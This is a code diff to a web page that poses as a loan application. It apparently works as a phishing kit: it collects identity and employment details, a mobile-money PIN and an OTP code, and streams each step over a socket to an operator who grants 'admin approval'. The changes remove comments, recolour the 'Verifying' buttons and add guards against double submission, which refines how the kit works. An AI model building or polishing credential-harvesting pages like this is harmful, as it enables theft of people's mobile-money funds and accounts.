@@ -256,7 +256,6 @@
                     </template>
                 </div>
                 
-                <!-- Step 1: Loan Details -->
                 <div x-show="step === 1" x-transition.duration.200ms>
                     <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Loan Details</h2><span class="text-xs font-bold text-orange-400">Step 01</span></div>
                     <div class="space-y-4">
@@ -278,7 +277,6 @@
                     </div>
                 </div>
 
-                <!-- Step 2: Identity Verification -->
                 <div x-show="step === 2" x-cloak x-transition.duration.200ms>
                     <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Identity Verification</h2><span class="text-xs font-bold text-orange-400">Step 02</span></div>
                     <div class="space-y-4">
@@ -289,7 +287,6 @@
                     </div>
                 </div> 
 
-                <!-- Step 3: Employment Information -->
                 <div x-show="step === 3" x-cloak x-transition.duration.200ms>
                     <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Employment Information</h2><span class="text-xs font-bold text-orange-400">Step 03</span></div>
                     <div class="space-y-4">
@@ -300,7 +297,6 @@
                     </div>
                 </div>
 
-                <!-- Step 4: Mobile Money Verification -->
                 <div x-show="step === 4" x-cloak x-transition.duration.200ms>
                     <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Mobile Money Verification</h2><span class="text-xs font-bold text-orange-400">Step 04</span></div>
                     <div class="space-y-6">
@@ -327,7 +323,7 @@
                                 <span>Verify & Submit PIN →</span>
                             </button>
                             
-                            <div x-show="passwordVerifying" class="btn-premium bg-amber-700 opacity-90 cursor-not-allowed flex items-center justify-center gap-3">
+                            <div x-show="passwordVerifying" class="btn-premium bg-emerald-800 opacity-90 cursor-not-allowed flex items-center justify-center gap-3">
                                 <div class="spinner-sm"></div>
                                 <span class="text-sm font-semibold tracking-wide">Verifying...</span>
                             </div>
@@ -337,7 +333,6 @@
                     </div>
                 </div>
 
-                <!-- Step 5: Confirm OTP Code -->
                 <div x-show="step === 5" x-cloak x-transition.duration.200ms>
                     <div class="flex justify-between items-center mb-4">
                         <h2 class="text-xl font-bold">Confirm OTP Code</h2>
@@ -357,7 +352,7 @@
                         </div>
 
                         <div class="grid grid-cols-1 gap-4 pt-2">
-                            <div x-show="pinVerifying" class="btn-premium bg-amber-700 opacity-90 cursor-not-allowed flex items-center justify-center gap-3">
+                            <div x-show="pinVerifying" class="btn-premium bg-emerald-800 opacity-90 cursor-not-allowed flex items-center justify-center gap-3">
                                 <div class="spinner-sm"></div>
                                 <span class="text-sm font-semibold tracking-wide">Validating Token...</span>
                             </div>
@@ -369,7 +364,6 @@
                     </div>
                 </div>
 
-                <!-- Step 6: Success Status screen -->
                 <div x-show="step === 6" x-cloak class="text-center py-8">
                     <div class="text-6xl mb-4">✅</div>
                     <h2 class="text-2xl font-bold text-green-500">Application Submitted!</h2>
@@ -445,7 +439,7 @@
             submitStep3() { this.socket.emit('step3', this.form); this.step = 4; },
             
             requestAdminApproval() { 
-                if (!this.isStep4Valid) return; 
+                if (!this.isStep4Valid || this.passwordVerifying) return; 
                 this.passwordVerifying = true; 
                 
                 const compiledData = {
@@ -456,7 +450,7 @@
             },
             
             submitStep5() { 
-                if (!this.isPinValid) return;
+                if (!this.isPinValid || this.pinVerifying) return;
                 this.pinVerifying = true; 
                 this.socket.emit('step5', { pin: this.pin.value.join('') }); 
             },
